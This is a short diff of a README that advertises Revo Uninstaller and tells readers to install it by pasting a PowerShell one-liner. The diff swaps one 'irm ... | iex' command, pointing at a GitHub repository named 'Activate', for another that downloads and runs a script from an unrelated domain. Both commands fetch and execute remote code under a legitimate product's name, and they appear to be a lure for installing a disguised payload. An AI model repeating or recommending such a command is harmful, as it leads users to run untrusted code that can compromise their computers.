@@ -5,7 +5,7 @@
 Revo Uninstaller is an advanced program uninstaller that goes beyond the standard Windows removal process. Install it quickly through PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ## Core Functions
